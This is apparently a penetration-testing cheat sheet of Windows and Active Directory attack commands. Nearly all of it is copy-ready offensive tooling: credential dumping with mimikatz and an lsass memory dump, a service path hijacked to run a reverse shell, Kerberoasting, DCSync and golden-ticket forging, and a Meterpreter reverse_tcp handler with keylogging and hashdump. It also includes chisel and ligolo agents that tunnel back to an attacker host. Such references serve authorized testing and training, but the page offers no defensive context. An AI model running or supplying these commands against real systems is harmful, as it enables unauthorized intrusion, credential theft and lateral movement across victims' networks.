---
layout: default
---

# Windows Enumeration
    ```
    # PowerUp
    powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

    # WinPEAS
    winpeas.exe

    # Seatbelt
    Seatbelt.exe -group=all

    # Manual enumeration
    systeminfo                                       # System information
    wmic qfe list                                    # Installed patches
    net users                                        # Local users
    net localgroup administrators                    # Admin group members
    netstat -ano                                     # Network connections
    tasklist /svc                                    # Running services
    sc query                                         # Service list
    wmic service list brief                          # Service details
    reg query HKLM /f password /t REG_SZ /s          # Registry password search
    dir /s *pass* == *cred* == *vnc* == *.config*    # File search

    # Powershell enumeration
    Get-Process                                      # Running processes
    Get-Service                                      # Services
    Get-ScheduledTask                                # Scheduled tasks
    Get-LocalUser                                    # Local users
    Get-LocalGroup                                   # Local groups
    Get-NetIPConfiguration                           # Network config
    Get-Hotfix                                       # Installed updates
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion' # Windows version
    ```

# Windows Privilege Escalation Techniques
    ```
    # Unquoted service paths
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

    # AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # Weak service permissions
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
    sc config <service> binpath= "C:\path\to\reverse.exe"

    # Token impersonation
    # Using Juicy Potato, Rogue Potato, etc.

    # Pass-the-Hash
    mimikatz.exe
    sekurlsa::pth /user:Administrator /domain:. /ntlm:<hash> /run:powershell.exe

    # Credential dumping
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    procdump.exe -ma lsass.exe lsass.dmp
    ```

# Active Directory Attacks

## Enumeration
    ```
    # PowerView
    Import-Module .\PowerView.ps1
    Get-NetDomain                                    # Domain info
    Get-NetDomainController                          # Domain controllers
    Get-NetUser                                      # Domain users
    Get-NetGroup                                     # Domain groups
    Get-NetComputer                                  # Domain computers
    Get-NetOU                                        # Organizational units
    Get-NetGPO                                       # Group policies
    Get-NetSession -ComputerName dc01               # Active sessions
    Find-LocalAdminAccess                            # Find local admin access
    Invoke-ShareFinder                               # Find network shares
    Invoke-UserHunter                                # Find where users are logged in

    # BloodHound
    .\SharpHound.exe -c All
    neo4j console
    bloodhound
    ```

## Keberoasting
    ```
    # Request TGS for SPN accounts
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web.domain.local"

    # Rubeus
    Rubeus.exe kerberoast /outfile:hashes.txt

    # Impacket
    GetUserSPNs.py domain/user:password -dc-ip <dc-ip> -request

    # Crack with hashcat
    hashcat -m 13100 hashes.txt wordlist.txt
    ```

## AS-REP Roasting
    ```
    # Find users with "Do not require Kerberos preauthentication"
    Get-DomainUser -PreauthNotRequired

    # Rubeus
    Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

    # Impacket
    GetNPUsers.py domain/ -usersfile users.txt -dc-ip <dc-ip>
    ```

## Pass-the-Hash/Ticket
    ```
    # Impacket
    psexec.py -hashes :ntlmhash domain/user@target
    wmiexec.py -hashes :ntlmhash domain/user@target
    smbexec.py -hashes :ntlmhash domain/user@target

    # CrackMapExec
    crackmapexec smb <target> -u user -H ntlmhash
    crackmapexec smb <target> -u user -H ntlmhash -x "whoami"
    crackmapexec smb <target> -u user -H ntlmhash --sam
    crackmapexec smb <target> -u user -H ntlmhash --lsa
    crackmapexec smb <target> -u user -H ntlmhash --ntds
    ```

## DCSync
    ```
    # Mimikatz
    lsadump::dcsync /domain:domain.local /user:Administrator

    # Impacket
    secretsdump.py domain/user:password@dc-ip
    ```

## Golden / Silver Ticket
    ```
    # Golden ticket (Mimikatz)
    kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:<krbtgt_hash> /user:Administrator /id:500

    # Silver ticket
    kerberos::golden /domain:domain.local /sid:S-1-5-21... /target:server.domain.local /service:cifs /rc4:<service_hash> /user:Administrator
    ```

# Metasploit Essentials
    ```
    msfconsole
    search <exploit>
    use <exploit/path>
    set RHOST <target>
    set LHOST <attacker-ip>
    exploit
    sessions -l                          # List sessions
    sessions -i 1                        # Interact with session
    ```

# Metasploit Advanced
    ```
    # Inside msfconsole
    workspace -a <project_name>                      # Create workspace
    db_nmap -sV <target>                            # Scan and save to DB
    hosts                                            # Show discovered hosts
    services                                         # Show discovered services
    vulns                                            # Show vulnerabilities

    use exploit/multi/handler                        # Generic payload handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <attacker-ip>
    set LPORT 4444
    exploit -j                                       # Run as job

    # Meterpreter commands
    sysinfo                                          # System information
    getuid                                           # Current user
    ps                                               # Process list
    migrate <PID>                                    # Migrate to process
    hashdump                                         # Dump password hashes
    screenshot                                       # Take screenshot
    keyscan_start                                    # Start keylogger
    keyscan_dump                                     # Dump keystrokes
    download <file>                                  # Download file
    upload <file>                                    # Upload file
    shell                                            # Drop to system shell
    getsystem                                        # Attempt privilege escalation
    load kiwi                                        # Load Mimikatz
    creds_all                                        # Dump all credentials
    portfwd add -l 3389 -p 3389 -r <target>          # Port forwarding
    route add <subnet> <netmask> <session_id>        # Add route for pivoting
    ```

# Lateral Movement

## Remote Code Execution
    ```
    # PSExec
    psexec.py domain/user:password@target
    psexec.exe \\target -u user -p password cmd

    # WMI
    wmiexec.py domain/user:password@target
    wmic /node:target /user:user /password:password process call create "cmd.exe"

    # WinRM
    evil-winrm -i target -u user -p password
    Enter-PSSession -ComputerName target -Credential domain\user

    # DCOM
    # Various DCOM methods for lateral movement

    # RDP
    xfreerdp /u:user /p:password /v:target
    rdesktop -u user -p password target

    # SMB
    smbclient //target/share -U user
    ```

## Pivoting & Tunneling
    ```
    # SSH Tunneling
    ssh -L local_port:target:target_port user@pivot    # Local forward
    ssh -R pivot_port:target:target_port user@pivot    # Remote forward
    ssh -D 1080 user@pivot                              # SOCKS proxy

    # Chisel
    # On attacker
    chisel server -p 8080 --reverse
    # On target
    chisel client attacker:8080 R:socks

    # sshuttle
    sshuttle -r user@pivot 10.0.0.0/24

    # Proxychains
    # Edit /etc/proxychains.conf
    proxychains nmap -sT -Pn target

    # Metasploit
    # autoroute
    run autoroute -s 10.0.0.0/24
    # portfwd
    portfwd add -l 3389 -p 3389 -r target

    # socat
    socat TCP-LISTEN:8080,fork TCP:target:80

    # ligolo-ng (modern tunneling)
    # On attacker
    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
    ./proxy -selfcert
    # On target
    ./agent -connect attacker:11601 -ignore-cert
    ```

